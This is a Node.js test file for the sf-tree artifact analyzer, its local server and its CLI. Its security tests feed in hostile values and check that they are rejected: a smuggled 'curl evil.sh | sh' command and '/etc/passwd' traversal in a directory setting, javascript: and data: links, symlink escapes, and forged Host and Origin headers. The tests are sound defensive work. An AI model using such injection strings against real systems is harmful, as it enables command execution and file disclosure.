import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { EventEmitter } from "node:events";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";

import {
  HR_RE,
  sanitizeMarkdownHref,
  tokenizeInline,
} from "../skills/sf-tree/scripts/ui/markdown.js";
import { computeScopedCriticalPath } from "../skills/sf-tree/scripts/ui/dag.js";
import {
  EDGES,
  STAGE_DEFS,
  analyzeWorkspace,
  analyzeWorkspaceAsync,
  extractSystemState,
  readArtifactDetail,
  readReviewDetail,
  sanitizeMockupsDir,
  validateSystemState,
} from "../skills/sf-tree/scripts/analyzer.mjs";
import { parsePorcelainDirtyPaths } from "../skills/sf-tree/scripts/analyzer-git.mjs";
import { createLiveServer, UI_CSP } from "../skills/sf-tree/scripts/server.mjs";
import {
  parseArgs as parseTreeCliArgs,
  validatePollMs,
  validatePort,
} from "../skills/sf-tree/scripts/cli.mjs";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const REPO_ROOT = path.resolve(__dirname, "..");

function makeTempDir(prefix = "sf-tree-pipe-") {
  return fs.mkdtempSync(path.join(os.tmpdir(), prefix));
}

function invokeHandler(server, { method = "GET", url = "/", headers = {}, body = null } = {}) {
  return new Promise((resolve) => {
    const req = new EventEmitter();
    req.method = method;
    req.url = url;
    req.headers = headers;
    req.destroy = () => {};
    req.resume = () => {};

    const res = new EventEmitter();
    res.statusCode = 200;
    res.headers = {};
    res.chunks = [];
    res.writableEnded = false;
    res.destroyed = false;
    res.writeHead = (code, hdrs = {}) => {
      res.statusCode = code;
      for (const [k, v] of Object.entries(hdrs)) {
        res.headers[k.toLowerCase()] = v;
      }
      return res;
    };
    res.write = (chunk) => {
      res.chunks.push(Buffer.isBuffer(chunk) ? chunk.toString("utf8") : String(chunk));
      return true;
    };
    res.end = (chunk) => {
      if (chunk !== undefined) {
        res.chunks.push(Buffer.isBuffer(chunk) ? chunk.toString("utf8") : String(chunk));
      }
      res.writableEnded = true;
      resolve({
        status: res.statusCode,
        headers: res.headers,
        body: res.chunks.join(""),
      });
      res.emit("close");
      return res;
    };

    server.emit("request", req, res);
    if (body !== null) {
      setImmediate(() => {
        req.emit("data", Buffer.from(body));
        req.emit("end");
      });
    } else if (method === "POST") {
      setImmediate(() => req.emit("end"));
    }
  });
}

function openSseMock(server, { url = "/events?initial=0", headers = {} } = {}) {
  const req = new EventEmitter();
  req.method = "GET";
  req.url = url;
  req.headers = headers;

  const res = new EventEmitter();
  res.statusCode = null;
  res.headers = {};
  res.chunks = [];
  res.writableEnded = false;
  res.destroyed = false;
  res.writeHead = (code, hdrs = {}) => {
    res.statusCode = code;
    for (const [k, v] of Object.entries(hdrs)) {
      res.headers[k.toLowerCase()] = v;
    }
    return res;
  };
  res.write = (chunk) => {
    res.chunks.push(Buffer.isBuffer(chunk) ? chunk.toString("utf8") : String(chunk));
    return true;
  };
  res.end = (chunk) => {
    if (chunk !== undefined) {
      res.chunks.push(Buffer.isBuffer(chunk) ? chunk.toString("utf8") : String(chunk));
    }
    res.writableEnded = true;
    res.emit("close");
    return res;
  };

  server.emit("request", req, res);
  return { req, res };
}

function writeStage(root, relPath, stateObj, extraBody = "") {
  const full = path.join(root, relPath);
  fs.mkdirSync(path.dirname(full), { recursive: true });
  const content = [
    `# Artifact ${path.basename(relPath)}`,
    extraBody,
    "",
    "<system_state>",
    JSON.stringify(stateObj, null, 2),
    "</system_state>",
    "",
  ].join("\n");
  fs.writeFileSync(full, content, "utf8");
  return full;
}

const VALID_VISION = {
  phase: "vision",
  project_name: "DemoApp",
  primary_user: "Solo engineers",
  ux_tone: "Crisp technical Swiss utility",
  hard_constraints: ["Zero npm deps"],
  explicitly_out_of_scope: ["Cloud sync"],
};

const VALID_BRD = {
  phase: "brd",
  monetization_model: "Open source MIT",
  core_kpis: ["<100ms analysis time"],
  compliance_requirements: ["Local-only processing"],
  budget_or_timeline_constraints: ["$0 infrastructure", "2 weeks"],
};

const VALID_PRD = {
  phase: "prd",
  core_flows: ["Inspect DAG"],
  business_rules: ["Enforce review gates"],
  required_integrations: ["Linear GraphQL"],
  edge_case_mitigations: [
    "Handle missing docs/factory gracefully",
    "Break cyclic dependencies cleanly",
    "Reject malformed JSON state blocks",
  ],
};

const VALID_UX = {
  phase: "ux",
  screens_required: ["Home"],
  primary_navigation_pattern: "Top bar",
  key_interactions: [{ trigger: "Click node", action: "Open inspector" }],
  accessibility_requirements: ["WCAG AA"],
};

const VALID_UI = {
  phase: "ui",
  css_framework_recommendation: "Vanilla CSS",
  color_palette: { primary: "#111", secondary: "#333", background: "#fff", text: "#000" },
  typography: { headings: "Inter", body: "Inter" },
  border_radius_base: "6px",
};

const VALID_MOCKERY = (overrides = {}) => ({
  phase: "mockery",
  fidelity: "wireframe",
  mockups_dir: "docs/factory/mockups",
  devices: ["desktop"],
  sections: ["Core"],
  screens: [
    {
      id: "home",
      title: "Home",
      file: "screens/home.html",
      device: "desktop",
      ux_screen_ref: "Home Screen",
      variant: "happy",
    },
  ],
  components: [],
  edges_count: 0,
  tokens_synced_from_ui: false,
  ...overrides,
});

const VALID_ARCHITECTURE = {
  phase: "architecture",
  frontend_stack: ["HTML5", "Vanilla ES Modules"],
  backend_stack: ["Node.js 20+"],
  database_type: "Local JSONL / Filesystem",
  data_models: [{ entity: "StageNode", fields: ["phase", "status", "is_stale"] }],
  core_endpoints: [{ method: "GET", path: "/api/graph", purpose: "Return pipeline DAG" }],
};

test("analyzer-schema: strict nested validation, </system_state> inside JSON string, and EDGES derived from STAGE_DEFS", () => {
  // EDGES is strictly derived from STAGE_DEFS
  const expectedEdgeCount = STAGE_DEFS.reduce(
    (sum, s) => sum + s.requiredUpstreams.length + s.recommendedUpstreams.length + s.optionalUpstreams.length,
    0
  );
  assert.equal(EDGES.length, expectedEdgeCount);

  // Embedded </system_state> inside JSON string value
  const md = `# Vision\n<system_state>\n${JSON.stringify({
    ...VALID_VISION,
    ux_tone: "Handles </system_state> safely inside string values",
  })}\n</system_state>\n`;
  const extracted = extractSystemState(md);
  assert.equal(extracted.found, true);
  assert.equal(extracted.error, null);
  assert.equal(validateSystemState(extracted.state, "vision").valid, true);

  // PRD requires >= 3 edge_case_mitigations
  const prdTooFew = validateSystemState(
    { ...VALID_PRD, edge_case_mitigations: ["Only one", "Only two"] },
    "prd"
  );
  assert.equal(prdTooFew.valid, false);
  assert.ok(prdTooFew.errors.some((e) => /at least 3/.test(e)));

  // Mockery fidelity vs tokens_synced_from_ui invariant (both directions)
  const wireSynced = validateSystemState(
    VALID_MOCKERY({ fidelity: "wireframe", tokens_synced_from_ui: true }),
    "mockery"
  );
  assert.equal(wireSynced.valid, false);
  assert.ok(wireSynced.errors.some((e) => /tokens_synced_from_ui/.test(e)));

  const styledUnsynced = validateSystemState(
    VALID_MOCKERY({ fidelity: "styled", tokens_synced_from_ui: false }),
    "mockery"
  );
  assert.equal(styledUnsynced.valid, false);

  // Market research invalid nested competitor type & invalid enum
  const badMr = validateSystemState(
    {
      phase: "market-research",
      competitors: ["NotAnObject"],
      market_gap_defined: "Gap",
      validation_status: "Validated",
      identified_risks: ["Risk"],
    },
    "market-research"
  );
  assert.equal(badMr.valid, false);
  assert.ok(badMr.errors.length >= 2);

  // Review PASS/FAIL consistency invariant
  const badPass = validateSystemState(
    {
      phase: "review",
      source_phases: ["vision"],
      target_phase: "prd",
      verdict: "PASS",
      critical_violations_count: 1,
      scope_creep_warnings_count: 0,
      blocking_issues: ["Broken"],
    },
    "review"
  );
  assert.equal(badPass.valid, false);
});

test("analyzer: reviews (hyphenated multi-source, FAIL non-masking, review_stale, invalid warnings), staleness propagation, and flow.json freshness", () => {
  const root = makeTempDir();
  try {
    const visionFile = writeStage(root, "docs/factory/01-vision.md", {
      ...VALID_VISION,
      ux_tone: "Safely ignore </system_state> inside string values",
    });
    writeStage(root, "docs/factory/02-market-research.md", {
      phase: "market-research",
      competitors: ["PlainStringNotObject"],
      market_gap_defined: "Local-first",
      validation_status: "Validated",
      identified_risks: ["None"],
    });
    const brdFile = writeStage(root, "docs/factory/03-brd.md", VALID_BRD);
    const prdFile = writeStage(root, "docs/factory/04-prd.md", VALID_PRD);
    const uxFile = writeStage(root, "docs/factory/05-ux.md", VALID_UX);
    const uiFile = writeStage(root, "docs/factory/06-ui.md", VALID_UI);
    const mockeryFile = writeStage(
      root,
      "docs/factory/06b-mockery.md",
      VALID_MOCKERY({ fidelity: "styled", tokens_synced_from_ui: false })
    );

    const reviewsDir = path.join(root, "docs/factory/reviews");
    fs.mkdirSync(reviewsDir, { recursive: true });
    fs.writeFileSync(path.join(reviewsDir, "stray-notes.md"), "No system_state here\n", "utf8");

    // Stale PASS on vision
    const visionReview = writeStage(root, "docs/factory/reviews/review-vision-pass.md", {
      phase: "review",
      source_phases: ["vision"],
      target_phase: "vision",
      verdict: "PASS",
      critical_violations_count: 0,
      scope_creep_warnings_count: 0,
      blocking_issues: [],
    });

    // Older FAIL on (["brd"], "prd") vs newer PASS on (["vision"], "prd")
    const prdFail = writeStage(root, "docs/factory/reviews/brd-vs-prd-review.md", {
      phase: "review",
      source_phases: ["brd"],
      target_phase: "prd",
      verdict: "FAIL",
      critical_violations_count: 1,
      scope_creep_warnings_count: 0,
      blocking_issues: ["Missing compliance flow"],
    });
    const prdPass = writeStage(root, "docs/factory/reviews/vision-vs-prd-review.md", {
      phase: "review",
      source_phases: ["vision"],
      target_phase: "prd",
      verdict: "PASS",
      critical_violations_count: 0,
      scope_creep_warnings_count: 0,
      blocking_issues: [],
    });

    // Multi-source hyphenated review filename targeting architecture
    const archFile = writeStage(root, "docs/factory/07-architecture.md", VALID_ARCHITECTURE);
    const multiSourceArchReview = writeStage(
      root,
      "docs/factory/reviews/vision-prd-vs-architecture-review.md",
      {
        phase: "review",
        source_phases: ["vision", "prd"],
        target_phase: "architecture",
        verdict: "PASS",
        critical_violations_count: 0,
        scope_creep_warnings_count: 0,
        blocking_issues: [],
      }
    );

    const baseSec = Math.floor(Date.now() / 1000) - 300;
    fs.utimesSync(visionReview, baseSec, baseSec);
    fs.utimesSync(visionFile, baseSec + 60, baseSec + 60);
    fs.utimesSync(brdFile, baseSec + 10, baseSec + 10);
    fs.utimesSync(prdFile, baseSec + 15, baseSec + 15);
    fs.utimesSync(uxFile, baseSec + 16, baseSec + 16);
    fs.utimesSync(uiFile, baseSec + 17, baseSec + 17);
    fs.utimesSync(prdFail, baseSec + 20, baseSec + 20);
    fs.utimesSync(prdPass, baseSec + 40, baseSec + 40);
    fs.utimesSync(mockeryFile, baseSec + 50, baseSec + 50);
    fs.utimesSync(archFile, baseSec + 70, baseSec + 70);
    fs.utimesSync(multiSourceArchReview, baseSec + 80, baseSec + 80);

    const graph = analyzeWorkspace(root);

    const visionNode = graph.nodes.find((n) => n.phase === "vision");
    assert.equal(visionNode.state_valid, true);
    assert.equal(visionNode.review_stale, true);
    assert.equal(visionNode.status, "review_stale");
    assert.ok(graph.summary.stale_review_phases.includes("vision"));

    const marketNode = graph.nodes.find((n) => n.phase === "market-research");
    assert.equal(marketNode.status, "invalid");
    assert.ok(marketNode.state_errors.length >= 2);

    const mockeryNode = graph.nodes.find((n) => n.phase === "mockery");
    assert.equal(mockeryNode.status, "invalid");
    assert.ok(mockeryNode.state_errors.some((e) => /tokens_synced_from_ui|fidelity/i.test(e)));

    assert.ok(graph.warnings.some((w) => w.includes("stray-notes.md")));

    // Active FAIL on (brd -> prd) must NOT be masked by newer PASS on (vision -> prd)
    const prdNode = graph.nodes.find((n) => n.phase === "prd");
    assert.equal(prdNode.status, "reviewed_fail");

    // Multi-source hyphenated review filename parsed and attached to architecture
    const archNode1 = graph.nodes.find((n) => n.phase === "architecture");
    assert.equal(archNode1.reviews.length, 1);
    assert.equal(archNode1.reviews[0].file, "docs/factory/reviews/vision-prd-vs-architecture-review.md");
    assert.deepEqual(archNode1.reviews[0].source_phases, ["vision", "prd"]);

    // Newer recommended upstream (brd) AND newer optional mockups/flow.json propagate staleness to architecture
    const validMockeryFile = writeStage(root, "docs/factory/06b-mockery.md", VALID_MOCKERY());
    const flowJson = path.join(root, "docs/factory/mockups/flow.json");
    fs.mkdirSync(path.dirname(flowJson), { recursive: true });
    fs.writeFileSync(flowJson, JSON.stringify({ screens: [{ id: "home" }], edges: [] }), "utf8");
    fs.utimesSync(validMockeryFile, baseSec + 65, baseSec + 65);
    fs.utimesSync(archFile, baseSec + 80, baseSec + 80);
    fs.utimesSync(brdFile, baseSec + 90, baseSec + 90);
    fs.utimesSync(flowJson, baseSec + 120, baseSec + 120);

    const graph2 = analyzeWorkspace(root);
    const archNode2 = graph2.nodes.find((n) => n.phase === "architecture");
    assert.equal(archNode2.state_valid, true);
    assert.equal(archNode2.is_stale, true);
    assert.ok(archNode2.stale_reasons.some((r) => r.includes("03-brd.md")));
    assert.ok(archNode2.stale_reasons.some((r) => r.includes("flow.json")));
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});

test("analyzer: rejects symlink escapes on artifacts/reviews and shell metacharacters in mockups_dir", () => {
  const root = makeTempDir("sf-an-root-");
  const outside = makeTempDir("sf-an-out-");
  try {
    fs.mkdirSync(path.join(root, "docs", "factory"), { recursive: true });
    fs.writeFileSync(path.join(outside, "secret.md"), "SECRET_DATA", "utf8");

    // Symlinked artifact 01-vision.md -> outside/secret.md
    fs.symlinkSync(
      path.join(outside, "secret.md"),
      path.join(root, "docs", "factory", "01-vision.md")
    );
    assert.equal(readArtifactDetail(root, "vision"), null, "Symlinked artifact must be rejected");

    // Symlinked docs/factory/reviews -> outside
    fs.symlinkSync(outside, path.join(root, "docs", "factory", "reviews"));
    const revDirSym = readReviewDetail(root, "secret.md");
    assert.equal(revDirSym.status, 400);
    assert.equal(revDirSym.error, "invalid_filename");

    // Also test symlinked individual review file inside real reviews/ dir
    fs.unlinkSync(path.join(root, "docs", "factory", "reviews"));
    fs.mkdirSync(path.join(root, "docs", "factory", "reviews"), { recursive: true });
    fs.symlinkSync(
      path.join(outside, "secret.md"),
      path.join(root, "docs", "factory", "reviews", "leak-review.md")
    );
    const revFileSym = readReviewDetail(root, "leak-review.md");
    assert.equal(revFileSym.status, 400);

    // Command injection & traversal in mockups_dir fall back to default
    assert.equal(
      sanitizeMockupsDir(root, "docs/factory/mockups; curl evil.sh | sh"),
      "docs/factory/mockups"
    );
    assert.equal(sanitizeMockupsDir(root, "docs/factory/../../etc"), "docs/factory/mockups");
    assert.equal(sanitizeMockupsDir(root, "/etc/passwd"), "docs/factory/mockups");
    assert.equal(sanitizeMockupsDir(root, "docs/factory/mockups-v2"), "docs/factory/mockups-v2");

    // Workspace analysis ignores symlinked artifact cleanly
    const graph = analyzeWorkspace(root);
    const vision = graph.nodes.find((n) => n.phase === "vision");
    assert.equal(vision.exists, false);
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
    fs.rmSync(outside, { recursive: true, force: true });
  }
});

test("analyzer-git: monorepo subdirectory dirty-file detection works in sync and async analyzers", async () => {
  assert.deepEqual(
    [
      ...parsePorcelainDirtyPaths(
        " M apps/web/docs/factory/01-vision.md\n?? apps/web/docs/factory/02-market-research.md\n",
        "apps/web/"
      ),
    ],
    ["docs/factory/01-vision.md", "docs/factory/02-market-research.md"]
  );

  const monoRoot = makeTempDir("sf-mono-");
  const prevGlobal = process.env.GIT_CONFIG_GLOBAL;
  const prevNoSystem = process.env.GIT_CONFIG_NOSYSTEM;
  process.env.GIT_CONFIG_GLOBAL = "/dev/null";
  process.env.GIT_CONFIG_NOSYSTEM = "1";
  const gitEnv = {
    ...process.env,
    GIT_CONFIG_GLOBAL: "/dev/null",
    GIT_CONFIG_NOSYSTEM: "1",
    GIT_AUTHOR_NAME: "Test",
    GIT_AUTHOR_EMAIL: "test@example.com",
    GIT_COMMITTER_NAME: "Test",
    GIT_COMMITTER_EMAIL: "test@example.com",
  };
  try {
    execFileSync("git", ["init", "-q"], { cwd: monoRoot, env: gitEnv });
    const appDir = path.join(monoRoot, "apps", "web");
    const visionPath = writeStage(appDir, "docs/factory/01-vision.md", VALID_VISION);
    execFileSync("git", ["add", "."], { cwd: monoRoot, env: gitEnv });
    execFileSync("git", ["commit", "-q", "-m", "initial"], { cwd: monoRoot, env: gitEnv });

    const cleanSync = analyzeWorkspace(appDir);
    const cleanAsync = await analyzeWorkspaceAsync(appDir);
    assert.equal(cleanSync.nodes.find((n) => n.phase === "vision").time_source, "git");
    assert.equal(cleanAsync.nodes.find((n) => n.phase === "vision").time_source, "git");

    fs.appendFileSync(visionPath, "\n<!-- dirty edit -->\n", "utf8");
    const dirtySync = analyzeWorkspace(appDir);
    const dirtyAsync = await analyzeWorkspaceAsync(appDir);
    assert.equal(dirtySync.nodes.find((n) => n.phase === "vision").time_source, "mtime");
    assert.equal(dirtyAsync.nodes.find((n) => n.phase === "vision").time_source, "mtime");
  } finally {
    if (prevGlobal === undefined) delete process.env.GIT_CONFIG_GLOBAL;
    else process.env.GIT_CONFIG_GLOBAL = prevGlobal;
    if (prevNoSystem === undefined) delete process.env.GIT_CONFIG_NOSYSTEM;
    else process.env.GIT_CONFIG_NOSYSTEM = prevNoSystem;
    fs.rmSync(monoRoot, { recursive: true, force: true });
  }
});

test("sf-tree ui: Markdown tokenizer ReDoS immunity (<50ms), balanced parens, URL allowlist, HR_RE, and computeScopedCriticalPath", () => {
  // Unclosed link with 60+ chars & deeply repeated open parens + HR_RE must stay O(n) (<50ms)
  const unclosedLink = "[" + "x".repeat(80) + "](" + "a(".repeat(2000);
  const adversarial = "[" + "a(".repeat(4000) + "](https://example.com)";
  const start = performance.now();
  const toks1 = tokenizeInline(unclosedLink);
  const toks2 = tokenizeInline(adversarial);
  assert.equal(HR_RE.test("-".repeat(120) + "x"), false);
  const elapsedMs = performance.now() - start;
  assert.ok(elapsedMs < 50, `Expected linear-time parsing (<50ms), got ${elapsedMs.toFixed(1)}ms`);
  assert.ok(toks1.length >= 1);
  assert.ok(toks2.length >= 1);

  // Balanced parens link
  const wiki = tokenizeInline("See [Topic](https://en.wikipedia.org/wiki/Foo_(bar)) now");
  const linkTok = wiki.find((t) => t.type === "link");
  assert.ok(linkTok);
  assert.equal(linkTok.href, "https://en.wikipedia.org/wiki/Foo_(bar)");
  assert.equal(linkTok.external, true);

  // Protocol allowlist
  assert.deepEqual(sanitizeMarkdownHref("https://example.com/a"), { href: "https://example.com/a", external: true });
  assert.deepEqual(sanitizeMarkdownHref("mailto:dev@example.com"), { href: "mailto:dev@example.com", external: false });
  assert.deepEqual(sanitizeMarkdownHref("#section"), { href: "#section", external: false });
  assert.deepEqual(sanitizeMarkdownHref("/docs/readme"), { href: "/docs/readme", external: false });
  assert.equal(sanitizeMarkdownHref("javascript:alert(1)"), null);
  assert.equal(sanitizeMarkdownHref("data:text/html,<script>1</script>"), null);
  assert.equal(sanitizeMarkdownHref("vbscript:msgbox(1)"), null);
  assert.equal(sanitizeMarkdownHref("//evil.example/x"), null);
  assert.equal(sanitizeMarkdownHref("/\\evil.example/x"), null);

  // HR_RE
  assert.equal(HR_RE.test("---"), true);
  assert.equal(HR_RE.test(" - - - "), true);
  assert.equal(HR_RE.test("***"), true);
  assert.equal(HR_RE.test("___"), true);
  assert.equal(HR_RE.test("-*-"), false);
  assert.equal(HR_RE.test("--"), false);

  // Scope-aware Critical Path DP (done items excluded)
  const scopedCp = computeScopedCriticalPath(
    [
      { id: "A", tech_status: "ready", tier: 0, estimate: 2 },
      { id: "B", tech_status: "blocked", tier: 1, estimate: 5 },
      { id: "C", tech_status: "done", tier: 2, estimate: 8 },
    ],
    [
      { from: "A", to: "B" },
      { from: "B", to: "C" },
    ]
  );
  assert.deepEqual(scopedCp.ids, ["A", "B"]);
  assert.equal(scopedCp.points, 7);

  // Verify modular UI cleanup invariants
  assert.equal(fs.existsSync(path.join(REPO_ROOT, "skills/sf-tree/scripts/ui.html")), false);
  const stylesCss = fs.readFileSync(path.join(REPO_ROOT, "skills/sf-tree/scripts/ui/styles.css"), "utf8");
  const darkRootMatches = stylesCss.match(/:root\[data-theme="dark"\]\s*\{/g) || [];
  assert.equal(darkRootMatches.length, 1, "Dark theme token block must be deduplicated");
  const appJs = fs.readFileSync(path.join(REPO_ROOT, "skills/sf-tree/scripts/ui/app.js"), "utf8");
  assert.ok(appJs.includes("http://127.0.0.1:5180"), "Default mockery preview URL must use port 5180");
  assert.equal(appJs.includes("4174"), false, "Legacy port 4174 must not remain in app.js");
});

test("sf-tree server: Host guard, CSRF on refresh, /ui/* static assets & strict non-inline CSP, artifact/review endpoints, HEAD, and SSE cap", async () => {
  const root = makeTempDir("sf-srv-root-");
  const outside = makeTempDir("sf-srv-out-");
  try {
    writeStage(root, "docs/factory/01-vision.md", VALID_VISION);
    writeStage(root, "docs/factory/reviews/vision-review.md", {
      phase: "review",
      source_phases: ["vision"],
      target_phase: "vision",
      verdict: "PASS",
      critical_violations_count: 0,
      scope_creep_warnings_count: 0,
      blocking_issues: [],
    });
    fs.writeFileSync(path.join(outside, "secret.md"), "TOP_SECRET", "utf8");
    fs.symlinkSync(
      path.join(outside, "secret.md"),
      path.join(root, "docs/factory/reviews/sym-review.md")
    );

    assert.ok(UI_CSP.includes("script-src 'self'"));
    assert.ok(UI_CSP.includes("style-src 'self'"));
    assert.equal(UI_CSP.includes("unsafe-inline"), false);

    const live = await createLiveServer({
      workspaceRoot: root,
      port: 0,
      linearProject: "Demo",
      fetchLinearImpl: async () => ({
        schema_version: "1.0",
        source: { kind: "linear_api", workspace: "Test", team: "SOF", live_refresh_supported: true },
        projects: [],
        milestones: [],
        items: [],
      }),
    });

    try {
      const validHost = `127.0.0.1:${live.port}`;

      // DNS rebinding Host rejected
      const badHost = await invokeHandler(live.server, {
        url: "/api/graph",
        headers: { host: `evil.example:${live.port}` },
      });
      assert.equal(badHost.status, 403);

      // GET / and all /ui/* static assets serve with strict CSP & nosniff
      const indexRes = await invokeHandler(live.server, { url: "/", headers: { host: validHost } });
      assert.equal(indexRes.status, 200);
      assert.equal(indexRes.headers["x-frame-options"], "DENY");
      assert.equal(indexRes.headers["content-security-policy"], UI_CSP);
      assert.match(indexRes.body, /<link[^>]+href="\/ui\/styles\.css"/);
      assert.match(indexRes.body, /<script[^>]+src="\/ui\/app\.js"/);

      const cssRes = await invokeHandler(live.server, { url: "/ui/styles.css", headers: { host: validHost } });
      assert.equal(cssRes.status, 200);
      assert.match(cssRes.headers["content-type"], /^text\/css/);
      assert.equal(cssRes.headers["x-content-type-options"], "nosniff");

      for (const jsAsset of ["/ui/markdown.js", "/ui/dag.js", "/ui/app.js"]) {
        const jsRes = await invokeHandler(live.server, { url: jsAsset, headers: { host: validHost } });
        assert.equal(jsRes.status, 200);
        assert.match(jsRes.headers["content-type"], /^application\/javascript/);
        assert.equal(jsRes.headers["x-content-type-options"], "nosniff");
      }

      // Path traversal & unsupported extension attempts rejected
      for (const badPath of ["/ui/../server.mjs", "/ui/%2e%2e/server.mjs", "/ui/secret.json"]) {
        const badRes = await invokeHandler(live.server, { url: badPath, headers: { host: validHost } });
        assert.ok(badRes.status === 400 || badRes.status === 403 || badRes.status === 404);
      }

      // /api/artifact/:phase & /api/review/:filename security + happy paths
      const artOk = await invokeHandler(live.server, { url: "/api/artifact/vision", headers: { host: validHost } });
      assert.equal(artOk.status, 200);
      assert.equal(JSON.parse(artOk.body).exists, true);

      const artBad = await invokeHandler(live.server, { url: "/api/artifact/unknown", headers: { host: validHost } });
      assert.equal(artBad.status, 404);

      const revOk = await invokeHandler(live.server, { url: "/api/review/vision-review.md", headers: { host: validHost } });
      assert.equal(revOk.status, 200);
      assert.equal(JSON.parse(revOk.body).system_state.verdict, "PASS");

      const revSym = await invokeHandler(live.server, { url: "/api/review/sym-review.md", headers: { host: validHost } });
      assert.equal(revSym.status, 400);

      // HEAD /api/graph omits body; HEAD /events rejected with 405
      const headGraph = await invokeHandler(live.server, { method: "HEAD", url: "/api/graph", headers: { host: validHost } });
      assert.equal(headGraph.status, 200);
      assert.equal(headGraph.body, "");

      const headEvents = await invokeHandler(live.server, { method: "HEAD", url: "/events", headers: { host: validHost } });
      assert.equal(headEvents.status, 405);

      // CSRF protection on POST /api/work-graph/refresh
      const noCsrf = await invokeHandler(live.server, {
        method: "POST",
        url: "/api/work-graph/refresh",
        headers: { host: validHost, origin: `http://${validHost}` },
      });
      assert.equal(noCsrf.status, 403);

      const crossSite = await invokeHandler(live.server, {
        method: "POST",
        url: "/api/work-graph/refresh",
        headers: {
          host: validHost,
          origin: `http://${validHost}`,
          "sec-fetch-site": "cross-site",
          "x-sf-tree-refresh": "1",
        },
      });
      assert.equal(crossSite.status, 403);

      const evilOrigin = await invokeHandler(live.server, {
        method: "POST",
        url: "/api/work-graph/refresh",
        headers: {
          host: validHost,
          origin: "https://evil.example",
          "x-sf-tree-refresh": "1",
        },
      });
      assert.equal(evilOrigin.status, 403);

      const withBody = await invokeHandler(live.server, {
        method: "POST",
        url: "/api/work-graph/refresh",
        headers: {
          host: validHost,
          origin: `http://${validHost}`,
          "x-sf-tree-refresh": "1",
          "content-length": "5",
        },
        body: "hello",
      });
      assert.ok(withBody.status === 400 || withBody.status === 413);

      const okRefresh = await invokeHandler(live.server, {
        method: "POST",
        url: "/api/work-graph/refresh",
        headers: {
          host: validHost,
          origin: `http://${validHost}`,
          "sec-fetch-site": "same-origin",
          "x-sf-tree-refresh": "1",
        },
      });
      assert.equal(okRefresh.status, 200);

      // SSE /events cap (50 clients accepted, 51st rejected with 503)
      const clients = [];
      for (let i = 0; i < 50; i += 1) {
        const c = openSseMock(live.server, { headers: { host: validHost } });
        assert.equal(c.res.statusCode, 200);
        clients.push(c);
      }
      const overflow = await invokeHandler(live.server, {
        url: "/events?initial=0",
        headers: { host: validHost },
      });
      assert.equal(overflow.status, 503);
      for (const c of clients) c.req.emit("close");
    } finally {
      await live.close();
    }
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
    fs.rmSync(outside, { recursive: true, force: true });
  }
});

test("sf-tree cli: --port (0..65535), --poll-ms (0 or >=5000), parseArgs, and custom mockups_dir watching", async () => {
  assert.equal(validatePort("0"), 0);
  assert.equal(validatePort("4173"), 4173);
  assert.equal(validatePort("65535"), 65535);
  assert.throws(() => validatePort("-1"), /port/i);
  assert.throws(() => validatePort("65536"), /port/i);
  assert.throws(() => validatePort("abc"), /port/i);

  assert.equal(validatePollMs("0"), 0);
  assert.equal(validatePollMs("5000"), 5000);
  assert.throws(() => validatePollMs("1000"), /poll/i);
  assert.throws(() => validatePollMs("-5"), /poll/i);
  assert.throws(() => validatePollMs("fast"), /poll/i);

  const parsed = parseTreeCliArgs(["--port=4200", "--poll-ms", "10000", "--view", "work", "--json"]);
  assert.equal(parsed.port, 4200);
  assert.equal(parsed.pollMs, 10000);
  assert.equal(parsed.view, "work");
  assert.equal(parsed.mode, "json");
  assert.throws(() => parseTreeCliArgs(["--unknown"]), /Unknown option/);

  const root = makeTempDir();
  try {
    const customMockupsDir = path.join(root, "docs/factory/custom-mockups");
    fs.mkdirSync(customMockupsDir, { recursive: true });
    writeStage(
      root,
      "docs/factory/06b-mockery.md",
      VALID_MOCKERY({ mockups_dir: "docs/factory/custom-mockups" })
    );

    const live = await createLiveServer({ workspaceRoot: root, port: 0 });
    try {
      assert.equal(live.getActiveMockupsDir(), "docs/factory/custom-mockups");
    } finally {
      await live.close();
    }
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});
